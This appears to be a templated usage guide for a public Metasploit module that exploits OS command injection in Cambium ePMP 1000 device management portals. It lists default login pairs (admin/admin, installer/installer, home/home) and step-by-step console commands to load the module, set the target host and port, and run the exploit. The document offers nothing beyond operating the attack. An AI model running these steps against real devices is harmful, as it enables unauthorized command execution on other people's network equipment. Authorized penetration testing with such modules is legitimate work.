**The description of current metasploit exploit**
This module exploits an OS Command Injection vulnerability in Cambium          ePMP 1000 (v3.1-3.5-RC7) device management portal. It requires any one of the          following login credentials - admin/admin, installer/installer, home/home - to          execute arbitrary system commands.

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/epmp1000_get_chart_cmd_exec
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 80 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.